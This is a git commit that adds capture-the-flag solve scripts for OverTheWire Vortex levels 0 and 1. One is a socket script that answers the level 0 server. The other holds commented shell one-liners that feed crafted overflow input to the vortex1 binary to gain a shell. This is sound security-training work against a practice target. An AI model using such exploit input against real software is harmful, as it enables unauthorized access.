54a3ce35f776c2310b79b8236d3d7afea97c4c77
Your Name <you@example.com>
2025-12-22 01:34:33 +0000

    12_21_2025

---
+++ ctf/vortex/l0/solve.py
@@ -0,0 +1,19 @@
+import socket
+import struct
+import telnetlib
+
+def interact():
+  print("==== INTERACT ====")
+  t = telnetlib.Telnet()
+  t.sock = s
+  t.interact()
+  
+s = socket.create_connection(("vortex.labs.overthewire.org", 5842))
+acc = 0
+for i in range(4):
+  acc += struct.unpack("I", s.recv(4))[0]
+
+s.send(struct.pack("I", acc))
+
+interact()
+
---
+++ ctf/vortex/l1/solve.py
@@ -0,0 +1,7 @@
+# python3 -c "print('\xac'*512)" | ./vortex1
+
+
+# python3" -c 'print("\\"*(257+4)+"\xca")' > /tmp/blah
+# cat /tmp/blah - | ./vortex1
+
+
